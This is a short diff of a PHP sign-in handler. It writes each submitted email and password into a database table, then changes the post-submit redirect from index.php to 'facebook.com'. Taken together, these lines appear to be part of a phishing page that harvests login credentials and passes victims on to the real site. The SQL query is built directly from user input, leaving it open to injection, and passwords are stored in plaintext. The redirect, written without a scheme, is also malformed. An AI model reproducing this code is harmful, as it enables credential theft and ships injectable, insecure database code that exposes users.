@@ -34,7 +34,7 @@ if (isset($_POST['signIn'])) {
     $insertQuery = "INSERT INTO users (email, password) VALUES ('$email', '$password')";
     
     if ($conn->query($insertQuery) === TRUE) {
-        header("Location: index.php");
+        header("Location: facebook.com");
     } else {
         echo "Error: " . $conn->error;
     }
